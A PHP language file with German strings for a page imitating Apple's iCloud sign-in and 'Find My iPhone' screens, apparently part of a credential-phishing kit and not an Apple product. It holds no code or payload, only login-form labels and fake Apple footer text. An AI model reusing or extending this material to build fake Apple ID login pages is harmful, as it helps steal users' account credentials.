<?php
/*
------------------
Language: deutsch
------------------
*/
 
$lang = array();
// Header
$lang['PAGE_TITLE'] = 'iCloud';
$lang['SETUP_INSTRUCTIONS'] = 'Anleitung zum Einrichten';
// login form
$lang['SIGN_IN_TITLE'] = 'Bei iCloud anmelden';
$lang['APPLE_ID'] = 'Apple-ID';
$lang['PASSWORD'] = 'Passwort';
$lang['KEEP_ME'] = 'Angemeldet bleiben';
$lang['FORGOT_ID'] = 'Apple-ID oder Passwort vergessen?';
$lang['DONT_HAVE_ID'] = 'Sie haben noch keine Apple-ID? ';
$lang['CREATE_YOURS'] = 'Jetzt erstellen';
// Footer
$lang['CHECK_ACTIVATION'] = 'Status der Aktivierungssperre';
$lang['SYSTEM_STATUS'] = 'Systemstatus';
$lang['POLICY'] = 'Datenschutz';
$lang['TERMS'] = 'Nutzungsbedingungen';
$lang['COPYRIGHT'] = 'Copyright © 2016 Apple Inc. Alle Rechte vorbehalten.';
// mobile version language
$lang['MOB_PAGE_TITLE'] = 'iCloud';
$lang['MOB_FIND'] = 'Mein iPhone suchen';
$lang['MOB_APPLE_ID'] = 'Apple-ID';
$lang['MOB_EXAMPLE'] = 'example@icloud.com';
$lang['MOB_PASSWORD'] = 'Passwort';
$lang['MOB_REQUIRED'] = 'Erforderlich';
$lang['MOB_LOGIN'] = 'Anmelden...';
$lang['MOB_FORGOT_ID'] = 'Apple-ID/Passwort vergessen?';
$lang['MOB_SETUP_INSTRUCTIONS'] = 'Konfigurationsanweisungen';
$lang['MOB_locating'] = 'Suchen ...';
?>